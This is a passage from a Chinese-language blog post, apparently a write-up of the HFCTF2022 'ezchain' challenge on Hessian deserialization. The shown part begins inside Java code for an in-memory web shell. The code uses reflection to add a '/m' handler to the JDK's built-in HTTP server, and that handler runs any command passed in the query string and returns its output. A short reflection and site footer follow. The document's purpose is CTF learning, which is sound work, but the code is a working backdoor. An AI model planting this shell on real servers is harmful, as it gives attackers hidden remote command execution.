</span></span><span style="display:flex;"><span>                target_dest = target_temp;
</span></span><span style="display:flex;"><span>                <span style="color:#6ab825;font-weight:bold">break</span>;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Field <span style="color:#6ab825;font-weight:bold">this</span>$0 = Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;sun.net.httpserver.ServerImpl$Dispatcher&#34;</span>).<span style="color:#bbb">getDeclaredField</span>(<span style="color:#ed9d13">&#34;this$0&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#6ab825;font-weight:bold">this</span>$0.<span style="color:#bbb">setAccessible</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        Object server_dest = <span style="color:#6ab825;font-weight:bold">this</span>$0.<span style="color:#bbb">get</span>(target_dest);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        Method createContext = Class.<span style="color:#bbb">forName</span>(<span style="color:#ed9d13">&#34;sun.net.httpserver.ServerImpl&#34;</span>).<span style="color:#bbb">getDeclaredMethod</span>(<span style="color:#ed9d13">&#34;createContext&#34;</span>, String.<span style="color:#bbb">class</span>, HttpHandler.<span style="color:#bbb">class</span>);
</span></span><span style="display:flex;"><span>        createContext.<span style="color:#bbb">setAccessible</span>(<span style="color:#6ab825;font-weight:bold">true</span>);
</span></span><span style="display:flex;"><span>        createContext.<span style="color:#bbb">invoke</span>(server_dest, <span style="color:#ed9d13">&#34;/m&#34;</span>, (HttpHandler) exchange1 -&gt; {
</span></span><span style="display:flex;"><span>            String queryRaw = exchange1.<span style="color:#bbb">getRequestURI</span>().<span style="color:#bbb">getQuery</span>();
</span></span><span style="display:flex;"><span>            String[] rawSplits = queryRaw.<span style="color:#bbb">split</span>(<span style="color:#ed9d13">&#34;=&#34;</span>);
</span></span><span style="display:flex;"><span>            System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(Arrays.<span style="color:#bbb">toString</span>(rawSplits));
</span></span><span style="display:flex;"><span>            InputStream resultStream = Runtime.<span style="color:#bbb">getRuntime</span>().<span style="color:#bbb">exec</span>(rawSplits[1]).<span style="color:#bbb">getInputStream</span>();
</span></span><span style="display:flex;"><span>            InputStreamReader reader = <span style="color:#6ab825;font-weight:bold">new</span> InputStreamReader(resultStream);
</span></span><span style="display:flex;"><span>            BufferedReader bufferedReader = <span style="color:#6ab825;font-weight:bold">new</span> BufferedReader(reader);
</span></span><span style="display:flex;"><span>            StringBuilder builder = <span style="color:#6ab825;font-weight:bold">new</span> StringBuilder();
</span></span><span style="display:flex;"><span>            String line;
</span></span><span style="display:flex;"><span>            <span style="color:#6ab825;font-weight:bold">while</span> ((line = bufferedReader.<span style="color:#bbb">readLine</span>()) != <span style="color:#6ab825;font-weight:bold">null</span>) {
</span></span><span style="display:flex;"><span>                builder.<span style="color:#bbb">append</span>(line);
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            exchange1.<span style="color:#bbb">sendResponseHeaders</span>(200, 0);
</span></span><span style="display:flex;"><span>            OutputStream os = exchange1.<span style="color:#bbb">getResponseBody</span>();
</span></span><span style="display:flex;"><span>            os.<span style="color:#bbb">write</span>(builder.<span style="color:#bbb">toString</span>().<span style="color:#bbb">getBytes</span>());
</span></span><span style="display:flex;"><span>            os.<span style="color:#bbb">close</span>();
</span></span><span style="display:flex;"><span>        });
</span></span><span style="display:flex;"><span>        System.<span style="color:#bbb">out</span>.<span style="color:#bbb">println</span>(<span style="color:#ed9d13">&#34;done&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    } <span style="color:#6ab825;font-weight:bold">catch</span> (Exception e) {
</span></span><span style="display:flex;"><span>        e.<span style="color:#bbb">printStackTrace</span>();
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="思考">思考</h2>
<p>题目的附件已经归档在了 <a href="https://github.com/F4ded/CTF_backup/tree/master/hfctf2022/ezchain">Github</a>，这道题给我的另一启发就是善用 IDEA 的搜索功能，在使用 <code>cmd + shift + f</code> 搜索功能的时候，一定要点击右下角的 <code>Open in find window</code> ！在浮动窗口搜索的结果不全，而且不便于检索。</p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/posts">All posts</a></li>
         
          <li><a href="/tags">Tags</a></li>
         
          <li><a href="/about">About</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents">
  <ul>
    <li><a href="#二次反序列化">二次反序列化</a></li>
    <li><a href="#内存马">内存马</a></li>
    <li><a href="#思考">思考</a></li>
  </ul>
</nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&text=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&title=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&is_video=false&description=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac&body=Check out this article: https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&title=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&title=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&name=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac&description=HFCTF2022%20ezchain%20%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%20%e8%bf%99%e9%81%93%e9%a2%98%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%bd%bf%e7%94%a8%e7%9a%84%e6%98%af%20Hessian%20%ef%bc%8c%e4%be%9d%e8%b5%96%e7%bb%99%e7%9a%84%e6%98%af%20ROME%20%ef%bc%8c%e8%bf%99%e4%b8%a4%e4%b8%aa%e7%bb%84%e5%90%88%e6%9c%80%e5%b8%b8%e8%a7%81%e7%9a%84%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f%e5%b0%b1%e6%98%af%e4%bb%a5%20JDBCRowSetImpl%20%e4%b8%ba%20sink%20%e7%9a%84JNDI%e6%b3%a8%e5%85%a5%ef%bc%8c%e4%bd%86%e6%98%af%e8%bf%99%e9%81%93%e9%a2%98%e7%9b%ae%e4%b8%8d%e5%87%ba%e7%bd%91%ef%bc%8c%e6%9c%80%e5%bc%80%e5%a7%8b%e6%83%b3%e5%88%b0%e7%9a%84%e8%a7%a3%e5%86%b3%e6%96%b9%e6%b3%95%e6%98%af%e7%94%a8%20TemplatesImpl%20%e4%b8%basink%ef%bc%8c%e4%bd%86%e6%98%af%e5%be%88%e5%bf%ab%e5%8f%91%e7%8e%b0%e6%98%af%e4%b8%8d%e5%8f%af%e7%94%a8%e7%9a%84%ef%bc%8c%e5%85%b7%e4%bd%93%e5%8e%9f%e5%9b%a0%e4%b8%ba%ef%bc%9aTemplatesImpl%20%e7%9a%84%20_tfactory%20%e5%ad%97%e6%ae%b5%e4%b8%ba%20transient%20%e4%bf%ae%e9%a5%b0%20%ef%bc%8c%e5%9c%a8%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e8%bf%87%e7%a8%8b%e4%b8%ad%e4%bc%9a%e8%a2%ab%e5%bf%bd%e7%95%a5%ef%bc%8c%e5%92%8cJava%e5%8e%9f%e7%94%9f%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8d%e5%90%8c%e7%9a%84%e6%98%af%ef%bc%8cHessian%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%97%b6%e5%80%99%e5%b9%b6%e4%b8%8d%e4%bc%9a%e5%b0%86%e8%bf%99%e4%b8%aa%e5%ad%97%e6%ae%b5%e8%bf%98%e5%8e%9f%ef%bc%8c%e5%9c%a8%20defineTransletClasses%28%29%20%e6%96%b9%e6%b3%95%e4%b8%ad%e6%97%a0%e6%b3%95%e5%b0%86%20_bytecodes%20%e4%b8%ad%e6%89%80%e6%90%ba%e5%b8%a6%e7%9a%84%e6%81%b6%e6%84%8f%e7%b1%bb%e7%9a%84%e5%ad%97%e8%8a%82%e7%a0%81%e5%8a%a0%e8%bd%bd%e5%88%b0JVM%e4%b8%ad%ef%bc%8c%e6%9c%80%e5%90%8e%e6%97%a0%e6%b3%95%e5%ae%8c%e6%88%90%e5%ae%9e%e4%be%8b%e5%8c%96%e3%80%82%0a%e4%bd%86%e6%98%af%20Hessian%20%e5%92%8c%20ROME%20%e8%bf%98%e6%98%af%e5%8f%af%e4%bb%a5%e5%ae%8c%e6%88%90%20getter%20%e6%96%b9%e6%b3%95%e8%b0%83%e7%94%a8%e7%9a%84%ef%bc%8c%e7%8e%b0%e5%9c%a8%e9%97%ae%e9%a2%98%e5%b0%b1%e5%8f%98%e6%88%90%e4%ba%86%e3%80%8c%e5%8f%af%e4%bb%a5%e8%b0%83%e7%94%a8%e4%b8%80%e4%b8%aa%e7%b1%bb%e7%9a%84%20getter%20%e6%96%b9%e6%b3%95%ef%bc%8c%e5%a6%82%e4%bd%95%e5%ae%8c%e6%88%90%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%20RCE%ef%bc%9f%e3%80%8d%ef%bc%8c%e5%9c%a8%e6%af%94%e8%b5%9b%e6%9c%9f%e9%97%b4%e6%98%af%e6%80%9d%e8%b7%af%e6%98%af%e4%bd%bf%e7%94%a8%20BCEL%20ClassLoader%20%e6%88%96%e8%80%85%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%9d%a5%e5%81%9a%ef%bc%8c%e4%bd%86%e6%98%af%e5%b9%b6%e6%b2%a1%e6%9c%89%e6%89%be%e5%88%b0%e5%90%88%e9%80%82%e7%9a%84%20getter%20%e6%96%b9%e6%b3%95%ef%bc%8c%e7%8e%b0%e5%9c%a8%e6%83%b3%e6%9d%a5%e6%98%af%e6%af%94%e8%be%83%e9%81%97%e6%86%be%e7%9a%84%e3%80%82%0a%e9%a2%98%e7%9b%ae%e7%9a%84%e6%ad%a3%e7%a1%ae%e5%81%9a%e6%b3%95%e6%98%af%e4%bd%bf%e7%94%a8%20java.security.SignedObject%20%e6%9d%a5%e6%9e%84%e9%80%a0%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%ef%bc%8c%e5%ae%83%e5%8f%af%e4%bb%a5%e5%8c%85%e8%a3%85%e4%b8%80%e4%b8%aa%e5%ba%8f%e5%88%97%e5%8c%96%e5%af%b9%e8%b1%a1%ef%bc%8c%e5%af%b9%e5%85%b6%e8%bf%9b%e8%a1%8c%e5%8a%a0%e5%af%86%e7%ad%be%e5%90%8d%ef%bc%8c%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e7%9a%84%e6%97%b6%e5%80%99%e5%8f%af%e4%bb%a5%e9%aa%8c%e8%af%81%e5%85%b6%e6%98%af%e5%90%a6%e8%a2%ab%e4%bf%ae%e6%94%b9%e3%80%82%e5%ae%83%e7%9a%84%20getObject%28%29%20%e6%96%b9%e6%b3%95%ef%bc%9a%0apublic%20Object%20getObject%28%29%20throws%20IOException%2c%20ClassNotFoundException%20%7b%20%20%2f%2f%20creating%20a%20stream%20pipe-line%2c%20from%20b%20to%20a%20%20ByteArrayInputStream%20b%20%3d%20new%20ByteArrayInputStream%28this.content%29%3b%20%20ObjectInput%20a%20%3d%20new%20ObjectInputStream%28b%29%3b%20%20Object%20obj%20%3d%20a." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fbikeknight.top%2fposts%2fhessianmemshell%2f&t=Hessian%e4%ba%8c%e6%ac%a1%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e4%b8%8eJDK%e8%87%aa%e5%b8%a6HTTP%e5%ba%93%e7%9a%84%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2022  Hello World 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">All posts</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>



  


<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    },
    svg: {
      fontCache: 'global'
    }
  };
</script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>

</html>
